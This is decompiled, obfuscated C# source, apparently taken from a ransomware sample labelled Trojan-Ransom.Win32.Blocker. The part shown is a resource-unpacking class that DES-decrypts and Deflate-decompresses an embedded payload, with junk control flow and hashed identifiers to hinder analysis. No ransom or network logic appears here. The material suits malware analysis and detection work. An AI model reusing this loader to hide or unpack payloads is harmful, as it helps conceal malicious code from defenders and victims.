// Decompiled with JetBrains decompiler
// Type: A.cdc5c4123a1b9d3403e934b2a29b6eccb
// Assembly: Loip, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FC9037DE-03A5-4A0F-BBDF-6193E92BDCC9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.cgkj-0e8e2b2a3f0a162b3135291eabffa555de93000ea7040c864c8e8d376efe9db6.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;

namespace A
{
  internal sealed class cdc5c4123a1b9d3403e934b2a29b6eccb
  {
    private static readonly object c5da23e34f6ce6694a8016b9b6b1c03ce;
    private static readonly int c6ac320abdff888a63439506a3f773a09;
    private static readonly int cc1f23e38974193607a35ac93f6504404;
    private static readonly MemoryStream c4a092154520eccad3589260257e9f70f = (MemoryStream) null;
    private static readonly MemoryStream c7e940baefca2ba39fcc86329add5bc19 = (MemoryStream) null;
    private static readonly byte cbac491d5fb2dda2ae5c8ebd133d46a5e;

    static cdc5c4123a1b9d3403e934b2a29b6eccb()
    {
      cdc5c4123a1b9d3403e934b2a29b6eccb.c6ac320abdff888a63439506a3f773a09 = int.MaxValue;
      cdc5c4123a1b9d3403e934b2a29b6eccb.cc1f23e38974193607a35ac93f6504404 = int.MinValue;
      cdc5c4123a1b9d3403e934b2a29b6eccb.c4a092154520eccad3589260257e9f70f = new MemoryStream(0);
      cdc5c4123a1b9d3403e934b2a29b6eccb.c7e940baefca2ba39fcc86329add5bc19 = new MemoryStream(0);
      cdc5c4123a1b9d3403e934b2a29b6eccb.c5da23e34f6ce6694a8016b9b6b1c03ce = new object();
    }

    private static string c704ef7ccd41104b179c8dfb378689101(
      Assembly c7024dd63ec33430fc26b1843d03c5ef8)
    {
      string str = c7024dd63ec33430fc26b1843d03c5ef8.FullName;
      int length = str.IndexOf(',');
      if (length >= 0)
        str = str.Substring(0, length);
      return str;
    }

    private static byte[] ccaf9266fe3ff13607b5f01551abc8129(
      Assembly c7024dd63ec33430fc26b1843d03c5ef8)
    {
      try
      {
        string fullName = c7024dd63ec33430fc26b1843d03c5ef8.FullName;
        int num1 = fullName.IndexOf("PublicKeyToken=");
        if (num1 < 0)
          num1 = fullName.IndexOf("publickeytoken=");
        if (num1 < 0)
        {
label_3:
          switch (4)
          {
            case 0:
              goto label_3;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (cdc5c4123a1b9d3403e934b2a29b6eccb.ccaf9266fe3ff13607b5f01551abc8129);
              }
              return (byte[]) null;
          }
        }
        else
        {
          int num2 = num1 + 15;
          if (fullName[num2] != 'n')
          {
            if (fullName[num2] == 'N')
            {
label_9:
              switch (2)
              {
                case 0:
                  goto label_9;
              }
            }
            else
            {
              byte[] bytes = BitConverter.GetBytes(long.Parse(fullName.Substring(num2, 16), NumberStyles.HexNumber));
              Array.Reverse((Array) bytes);
              return bytes;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] c535d5033edd60f14b4e8f977ab1f6cc2(
      Stream c9ee79e7adfd6d622918f81a469373d39)
    {
      lock (cdc5c4123a1b9d3403e934b2a29b6eccb.c5da23e34f6ce6694a8016b9b6b1c03ce)
        return cdc5c4123a1b9d3403e934b2a29b6eccb.c25ec3013bc08bbdd7feadb8c7fa30387(97L, c9ee79e7adfd6d622918f81a469373d39);
    }

    internal static byte[] ce35ad390e89210c380f77493dd763c60(
      long cbac491d5fb2dda2ae5c8ebd133d46a5e,
      Stream c9ee79e7adfd6d622918f81a469373d39)
    {
      try
      {
        return cdc5c4123a1b9d3403e934b2a29b6eccb.c535d5033edd60f14b4e8f977ab1f6cc2(c9ee79e7adfd6d622918f81a469373d39);
      }
      catch (HostProtectionException ex)
      {
        return cdc5c4123a1b9d3403e934b2a29b6eccb.c25ec3013bc08bbdd7feadb8c7fa30387(97L, c9ee79e7adfd6d622918f81a469373d39);
      }
    }

    internal static byte[] c25ec3013bc08bbdd7feadb8c7fa30387(
      long cbac491d5fb2dda2ae5c8ebd133d46a5e,
      Stream c9ee79e7adfd6d622918f81a469373d39)
    {
      Stream stream = c9ee79e7adfd6d622918f81a469373d39;
      MemoryStream memoryStream = (MemoryStream) null;
      ushort num1 = ~(ushort) c9ee79e7adfd6d622918f81a469373d39.ReadByte();
      for (int index = 1; index < 3; ++index)
        c9ee79e7adfd6d622918f81a469373d39.ReadByte();
label_3:
      switch (4)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (cdc5c4123a1b9d3403e934b2a29b6eccb.c25ec3013bc08bbdd7feadb8c7fa30387);
          }
          if (((int) num1 & 2) != 0)
          {
label_7:
            switch (2)
            {
              case 0:
                goto label_7;
              default:
                DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
                byte[] buffer1 = new byte[8];
                c9ee79e7adfd6d622918f81a469373d39.Read(buffer1, 0, 8);
                cryptoServiceProvider.IV = buffer1;
                byte[] buffer2 = new byte[8];
                c9ee79e7adfd6d622918f81a469373d39.Read(buffer2, 0, 8);
                bool flag = true;
                foreach (byte num2 in buffer2)
                {
                  if (num2 != (byte) 0)
                  {
label_10:
                    switch (3)
                    {
                      case 0:
                        goto label_10;
                      default:
                        flag = false;
                        goto label_15;
                    }
                  }
                }
label_14:
                switch (2)
                {
                  case 0:
                    goto label_14;
                }
label_15:
                if (flag)
                {
label_16:
                  switch (4)
                  {
                    case 0:
                      goto label_16;
                    default:
                      buffer2 = cdc5c4123a1b9d3403e934b2a29b6eccb.ccaf9266fe3ff13607b5f01551abc8129(Assembly.GetExecutingAssembly());
                      break;
                  }
                }
                cryptoServiceProvider.Key = buffer2;
                if (cdc5c4123a1b9d3403e934b2a29b6eccb.c4a092154520eccad3589260257e9f70f == null)
                {
                  if (cdc5c4123a1b9d3403e934b2a29b6eccb.c6ac320abdff888a63439506a3f773a09 == int.MaxValue)
                  {
label_20:
                    switch (6)
                    {
                      case 0:
                        goto label_20;
                      default:
                        cdc5c4123a1b9d3403e934b2a29b6eccb.c4a092154520eccad3589260257e9f70f.Capacity = (int) c9ee79e7adfd6d622918f81a469373d39.Length;
                        break;
                    }
                  }
                  else
                    cdc5c4123a1b9d3403e934b2a29b6eccb.c4a092154520eccad3589260257e9f70f.Capacity = cdc5c4123a1b9d3403e934b2a29b6eccb.c6ac320abdff888a63439506a3f773a09;
                }
                cdc5c4123a1b9d3403e934b2a29b6eccb.c4a092154520eccad3589260257e9f70f.Position = 0L;
                ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor();
                int inputBlockSize = decryptor.InputBlockSize;
                int outputBlockSize = decryptor.OutputBlockSize;
                byte[] numArray1 = new byte[decryptor.OutputBlockSize];
                byte[] numArray2 = new byte[decryptor.InputBlockSize];
                int position;
                for (position = (int) c9ee79e7adfd6d622918f81a469373d39.Position; (long) (position + inputBlockSize) < c9ee79e7adfd6d622918f81a469373d39.Length; position += inputBlockSize)
                {
                  c9ee79e7adfd6d622918f81a469373d39.Read(numArray2, 0, inputBlockSize);
                  int count = decryptor.TransformBlock(numArray2, 0, inputBlockSize, numArray1, 0);
                  cdc5c4123a1b9d3403e934b2a29b6eccb.c4a092154520eccad3589260257e9f70f.Write(numArray1, 0, count);
                }
label_26:
                switch (3)
                {
                  case 0:
                    goto label_26;
                  default:
                    c9ee79e7adfd6d622918f81a469373d39.Read(numArray2, 0, (int) (c9ee79e7adfd6d622918f81a469373d39.Length - (long) position));
                    byte[] buffer3 = decryptor.TransformFinalBlock(numArray2, 0, (int) (c9ee79e7adfd6d622918f81a469373d39.Length - (long) position));
                    cdc5c4123a1b9d3403e934b2a29b6eccb.c4a092154520eccad3589260257e9f70f.Write(buffer3, 0, buffer3.Length);
                    stream = (Stream) cdc5c4123a1b9d3403e934b2a29b6eccb.c4a092154520eccad3589260257e9f70f;
                    stream.Position = 0L;
                    memoryStream = cdc5c4123a1b9d3403e934b2a29b6eccb.c4a092154520eccad3589260257e9f70f;
                    break;
                }
                break;
            }
          }
          if (((int) num1 & 8) != 0)
          {
            try
            {
              if (cdc5c4123a1b9d3403e934b2a29b6eccb.c7e940baefca2ba39fcc86329add5bc19 == null)
              {
label_30:
                switch (1)
                {
                  case 0:
                    goto label_30;
                  default:
                    cdc5c4123a1b9d3403e934b2a29b6eccb.c7e940baefca2ba39fcc86329add5bc19.Capacity = cdc5c4123a1b9d3403e934b2a29b6eccb.cc1f23e38974193607a35ac93f6504404 != int.MinValue ? cdc5c4123a1b9d3403e934b2a29b6eccb.cc1f23e38974193607a35ac93f6504404 : (int) stream.Length * 2;
                    break;
                }
              }
              cdc5c4123a1b9d3403e934b2a29b6eccb.c7e940baefca2ba39fcc86329add5bc19.Position = 0L;
              DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
              int count1 = 1000;
              byte[] buffer = new byte[count1];
              int count2;
              do
              {
                count2 = deflateStream.Read(buffer, 0, count1);
                if (count2 > 0)
                {
label_34:
                  switch (1)
                  {
                    case 0:
                      goto label_34;
                    default:
                      cdc5c4123a1b9d3403e934b2a29b6eccb.c7e940baefca2ba39fcc86329add5bc19.Write(buffer, 0, count2);
                      break;
                  }
                }
              }
              while (count2 >= count1);
label_37:
              switch (1)
              {
                case 0:
                  goto label_37;
                default:
                  memoryStream = cdc5c4123a1b9d3403e934b2a29b6eccb.c7e940baefca2ba39fcc86329add5bc19;
                  break;
              }
            }
            catch (Exception ex)
            {
            }
          }
          if (memoryStream != null)
          {
label_41:
            switch (4)
            {
              case 0:
                goto label_41;
              default:
                return memoryStream.ToArray();
            }
          }
          else
          {
            byte[] buffer = new byte[c9ee79e7adfd6d622918f81a469373d39.Length - c9ee79e7adfd6d622918f81a469373d39.Position];
            c9ee79e7adfd6d622918f81a469373d39.Read(buffer, 0, buffer.Length);
            return buffer;
          }
      }
    }
  }
}
